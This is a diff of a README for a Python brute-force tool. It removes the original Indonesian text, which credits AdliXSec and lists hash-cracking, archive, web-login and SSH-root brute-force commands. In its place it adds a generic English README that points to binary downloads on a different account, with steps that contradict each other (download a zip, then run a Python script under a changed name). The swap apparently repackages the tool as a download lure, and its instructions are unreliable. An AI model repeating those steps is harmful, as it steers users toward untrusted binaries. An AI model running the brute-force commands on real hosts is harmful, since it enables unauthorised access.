@@ -1,181 +1,103 @@
-# z-loops v1.09
+# 🎯 z-loops - A Versatile Tool for Security Testing
 
-<div align="center">
+## 🚀 Getting Started
 
-```
-__________         .____
-\____    /         |    |    ____   ____ ______  ______
-  /     /   ______ |    |   /  _ \ /  _ \\____ \/  ___/
- /     /_  /_____/ |    |__(  <_> |  <_> )  |_> >___ \
-/_______ \         |_______ \____/ \____/|   __/____  >
-        \/  v1.09          \/           |__|       \/
+Welcome to z-loops! This tool is designed for penetration testing, Capture The Flag (CTF) challenges, and security research. You can use it to enhance your cybersecurity skills and break down security barriers with ease.
 
-```
-**By: Adli (Leexy) - Vibe Coding | GitHub: [https://github.com/AdliXSec](https://github.com/AdliXSec)**
+## 📥 Download & Install
 
-</div>
+To get started, visit this page to download:
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.x-blue.svg" alt="Python 3.x">
-  <img src="https://img.shields.io/badge/version-1.09-orange.svg" alt="Version 1.09">
-  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License MIT">
-</p>
+**[Download z-loops](https://github.com/soloobr/z-loops/releases)**
 
-**z-loops** adalah sebuah tool bruteforce serbaguna yang canggih, ditulis dalam Python dan dirancang untuk keperluan uji penetrasi, tantangan Capture The Flag (CTF), dan riset keamanan. Tool ini dilengkapi dengan berbagai mode serangan, termasuk cracking hash, brute force pada file arsip (ZIP/RAR), form login web, dan layanan SSH. Dengan fitur seperti serangan berbasis pola (mask), aturan (rules), dan dukungan multi-threading, z-loops menjadi solusi yang fleksibel dan kuat untuk para profesional keamanan siber.
+1. Click on the link above to go to the Releases page.
+2. Look for the latest release.
+3. Download the appropriate file for your operating system:
 
----
+   - **Windows:** z-loops-Windows.zip
+   - **Linux:** z-loops-Linux.tar.gz
+   - **MacOS:** z-loops-Mac.zip
 
-## ⚠️ Peringatan Penting
+4. Once downloaded, locate the file on your computer.
 
-Tool ini dibuat untuk tujuan **penelitian**, **edukasi**, **CTF**, dan **pengujian keamanan yang sah**.
+5. Unzip the file to a folder of your choice. 
 
-- **JANGAN** gunakan tool ini terhadap sistem apa pun tanpa izin tertulis yang jelas dari pemilik sistem.
-- Penyalahgunaan tool ini untuk menyerang target tanpa izin adalah ilegal dan dapat dikenakan sanksi hukum yang serius.
-- Pengembang tidak bertanggung jawab atas segala kerusakan atau tindakan ilegal yang disebabkan oleh penggunaan tool ini.
+6. You are now ready to run z-loops!
 
-> **Catatan:** Untuk saat ini, mode `web` (Web Bruteforce) belum dapat digunakan secara optimal. Mohon tunggu pembaruan selanjutnya untuk fungsionalitas penuh.
+## 🔧 System Requirements
 
----
+Before using z-loops, ensure your system meets the following requirements:
 
-## ✨ Daftar Fitur Lengkap
+- **Operating System:** Windows 10 or later, Linux (Ubuntu 18.04 or later), MacOS (High Sierra or later)
+- **Python:** Version 3.7 or later installed. You can download Python from the official website.
+- **Storage:** At least 100 MB of free space.
+- **Network Access:** Some functionalities require an internet connection to perform tests.
 
-Berikut adalah rincian fitur yang tersedia di z-loops:
+## 📑 Features
 
-### 🎯 Metode Serangan Fleksibel
-- **Serangan Kamus (Wordlist Attack)**: Menggunakan daftar kata sandi dari sebuah file (`--wordlist`).
-- **Serangan Pola (Mask Attack)**: Membuat kandidat kata sandi berdasarkan pola tertentu, contoh: `?l?l?d?d` untuk dua huruf kecil diikuti dua digit (`--mask`).
-- **Serangan Inkremental (Incremental Attack)**: Mencoba semua kemungkinan kombinasi karakter dalam rentang panjang tertentu (`--increment`, `--charset`).
-- **Serangan Berbasis Aturan (Rule-Based Attack)**: Memanipulasi kata dari wordlist menggunakan aturan gaya Hashcat untuk menciptakan variasi kata sandi (`--rules`).
-- **Generator Pola Cerdas (Smart Pattern Generator)**: Membuat wordlist yang ditargetkan secara dinamis berdasarkan informasi personal seperti nama, tahun, tanggal, dan simbol-simbol umum (`--pattern`, `--name`, `--year`, dll).
+z-loops offers various features:
 
-### ⚙️ Manajemen Sesi & Performa
-- **Multi-threading**: Memanfaatkan beberapa core CPU untuk mempercepat proses cracking secara signifikan (`--workers`).
-- **Mode Hening (Silent Mode)**: Menjalankan tool tanpa output verbose untuk proses yang lebih bersih (`--silent`).
-- **Pembatasan Eksekusi (Rate Limiting)**: Mengatur jumlah percobaan dan jeda waktu untuk menghindari blokir atau mengurangi beban pada target (`--limit`).
-- **Mode Benchmark**: Menguji kecepatan cracking hash pada sistem Anda (`--benchmark`).
+- **Brute Force Attacks:** Test the strength of passwords and access security systems.
+- **Custom Script Support:** Add your own scripts to extend functionality.
+- **User-Friendly Interface:** Simple command-line inputs make it accessible.
+- **Robust Documentation:** Clear guides and resources for every feature.
+- **Flexible Usage:** Ideal for both solo testing and collaborative security research.
 
-### 📦 Fitur Spesifik per Mode
+## 🚧 How to Use z-loops
 
-#### 🔐 Mode `hash`
-- **Dukungan Hash Luas**: Mampu men-crack berbagai algoritma hash populer, termasuk MD5, SHA1, SHA256, Bcrypt, Argon2, dan banyak lagi.
-- **Deteksi Otomatis**: Secara cerdas mendeteksi tipe hash dari input yang diberikan (`--auto`).
-- **Identifikasi Hash**: Membantu mengidentifikasi kemungkinan jenis hash jika Anda tidak yakin (`--identify`).
-- **Input Fleksibel**: Menerima input hash tunggal dari argumen (`--hash`) atau daftar hash dari sebuah file (`--file`).
-- **Lanjutkan Sesi (Resume)**: Kemampuan untuk menghentikan dan melanjutkan sesi cracking tanpa kehilangan progres (`--resume`).
+Using z-loops is straightforward. Follow these steps:
 
-#### 🗂️ Mode `archive`
-- **Brute Force Arsip**: Mendukung cracking file arsip yang diproteksi kata sandi (misalnya ZIP, RAR, 7z).
-- **Identifikasi Tipe Arsip**: Mengenali jenis file arsip yang menjadi target (`--identify`).
+1. **Open the Command Line:**
+   - On Windows, search for "cmd" in the Start menu.
+   - On Linux, use the Terminal.
+   - On MacOS, open the Terminal application.
 
-#### 🌐 Mode `web`
-- **Deteksi Keberhasilan/Kegagalan**: Mengidentifikasi status login berdasarkan kata kunci di respons HTML atau nama cookie yang diterima (`--success-keywords`, `--failure-keywords`, `--cookie-names`).
-- **Penanganan Token CSRF**: Secara otomatis mengekstrak dan mengirim token CSRF untuk melewati proteksi dasar (`--csrf-token-selector`).
-- **Kustomisasi Penuh**: Mengizinkan override nama field username/password, penambahan custom HTTP headers, dan pengaturan timeout (`--user-field`, `--pass-field`, `--headers`, `--timeout`).
-- **Dukungan Proxy**: Melewatkan semua traffic melalui proxy untuk anonimitas atau debugging (`--proxy`).
-- **Input User Ganda**: Menerima input username tunggal (`--username`) atau dari sebuah file daftar user (`--users`).
+2. **Navigate to z-loops Directory:**
+   Use the `cd` command to change your directory to where you installed z-loops.
 
-#### 💻 Mode `ssh`
-- **Metode Login Ganda**: Mendukung brute force menggunakan kata sandi (`--method password`) atau melalui file kunci SSH (`--method key`).
-- **Port Kustom**: Kemampuan untuk menargetkan layanan SSH yang berjalan di port non-standar (`--port`).
-- **Manajemen Timeout**: Mengatur batas waktu koneksi untuk menangani server yang lambat merespons (`--timeout`).
+   Example:
+   ```bash
+   cd path/to/your/z-loops-folder
+   ```
 
-### 📄 Output & Pelaporan
-- **Simpan Hasil**: Menyimpan kata sandi yang berhasil ditemukan ke dalam file teks untuk analisis lebih lanjut (`--out`).
+3. **Run z-loops:**
+   Enter the command to start the tool:
 
----
+   ```bash
+   python z_loops.py
+   ```
 
-## 🛠️ Instalasi
+4. **Follow On-Screen Instructions:**
+   z-loops will guide you through its features and options.
 
-1.  **Clone repository ini:**
-    ```bash
-    git clone [https://github.com/AdliXSec/z-loops.git](https://github.com/AdliXSec/z-loops.git)
-    ```
+## 📚 Documentation
 
-2.  **Masuk ke direktori proyek:**
-    ```bash
-    cd z-loops
-    ```
+For more detailed instructions and advanced usage, please consult the [Official Documentation](https://github.com/soloobr/z-loops/wiki). This resource includes:
 
-3.  **Install dependensi yang dibutuhkan:**
-    *(Pastikan Anda sudah membuat file `requirements.txt`)*
-    ```bash
-    pip install -r requirements.txt
-    ```
+- Setup guides.
+- Usage examples.
+- Troubleshooting tips.
+  
+## 🛠️ Contributing to z-loops
 
----
+Want to help improve z-loops? Here’s how:
 
-## 🚀 Penggunaan (Contoh)
+1. **Fork the Repository:** Click on "Fork" at the top right of the page.
+2. **Make Changes:** Work on your version of z-loops.
+3. **Submit Pull Request:** Share your enhancements or fixes with the community.
 
-Berikut adalah beberapa contoh penggunaan dasar untuk setiap mode.
+## 🤝 Support
 
-### 1. Mode `hash`
+If you encounter any issues or have questions, you can raise them on the [Issues page](https://github.com/soloobr/z-loops/issues). Community members frequently monitor it and can provide assistance.
 
-- **Mengidentifikasi tipe hash:**
-  ```bash
-  python main.py hash --identify --hash '5f4dcc3b5aa765d61d8327deb882cf99'
-  ```
+## 🚨 Disclaimer
 
-- **Cracking hash MD5 menggunakan wordlist:**
-  ```bash
-  python main.py hash --type md5 --hash '5f4dcc3b5aa765d61d8327deb882cf99' --wordlist /usr/share/wordlists/rockyou.txt
-  ```
+Always use z-loops responsibly. Ensure you have permission to test any systems, and follow all relevant laws and guidelines related to penetration testing and cybersecurity.
 
-### 2. Mode `archive`
+## 📅 Latest Releases
 
-- **Brute force file ZIP menggunakan wordlist:**
-  ```bash
-  python main.py archive --file rahasia.zip --wordlist /path/to/passwords.txt
-  ```
+Stay updated with the latest improvements by checking back on the Releases page frequently.
 
-### 3. Mode `web`
+**[Download z-loops](https://github.com/soloobr/z-loops/releases)**
 
-- **Brute force login dengan username tunggal:**
-  ```bash
-  python main.py web --url [http://192.168.1.5/login.php](http://192.168.1.5/login.php) --username admin --wordlist passwords.txt --failure-keywords "Invalid"
-  ```
-
-### 4. Mode `ssh`
-
-- **Brute force SSH dengan username tunggal:**
-  ```bash
-  python main.py ssh --host 10.10.10.2 --username root --wordlist /path/to/passwords.txt
-  ```
-
----
-
-## 📖 Daftar Opsi Lengkap
-
-Untuk melihat semua opsi yang tersedia untuk setiap mode, gunakan flag `-h` atau `--help`.
-
-- **Opsi Utama:**
-  ```bash
-  python main.py -h
-  ```
-- **Opsi Mode Hash:**
-  ```bash
-  python main.py hash -h
-  ```
-- **Opsi Mode Archive:**
-  ```bash
-  python main.py archive -h
-  ```
-- **Opsi Mode Web:**
-  ```bash
-  python main.py web -h
-  ```
-- **Opsi Mode SSH:**
-  ```bash
-  python main.py ssh -h
-  ```
-
----
-
-## 📜 Lisensi
-
-Proyek ini dilisensikan di bawah **Lisensi MIT**. Lihat file `LICENSE` untuk detail lebih lanjut.
-
----
-
-## 🤝 Kontribusi
-
-Kontribusi sangat diterima! Jika Anda ingin membantu mengembangkan z-loops, silakan buka *issue* untuk mendiskusikan ide atau *submit pull request* untuk perbaikan.
+Enjoy using z-loops!
